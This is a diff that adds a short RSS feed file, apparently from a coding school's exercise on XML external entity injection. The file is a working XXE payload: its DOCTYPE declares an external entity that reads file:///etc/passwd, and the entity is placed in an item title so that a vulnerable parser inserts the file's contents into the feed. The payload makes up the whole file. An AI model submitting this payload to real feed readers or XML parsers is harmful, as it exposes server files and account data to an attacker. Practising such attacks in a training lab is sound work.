@@ -1,0 +1,16 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY toto SYSTEM "file:///etc/passwd">]>
+<rss version="2.0">
+  <channel>
+    <title>Mon article</title>
+    <link>https://raw.githubusercontent.com/Martine-22/wildcodeschool/main/Injection%20-%20XML%20eXternal%20Entity/index.html</link>
+    <description>NOUVEAU</description>
+    <pubDate>Mon, 13 Jun 2022 07:00:00 GMT</pubDate>
+    <item>
+      <title>Super &toto;</title>
+      <link>https://raw.githubusercontent.com/Martine-22/wildcodeschool/main/Injection%20-%20XML%20eXternal%20Entity/index.html</link>
+      <description>Hello World!!!</description>
+      <pubDate>Mon, 13 Jun 2022 08:00:00 GMT</pubDate>
+    </item>
+  </channel>
+</rss>
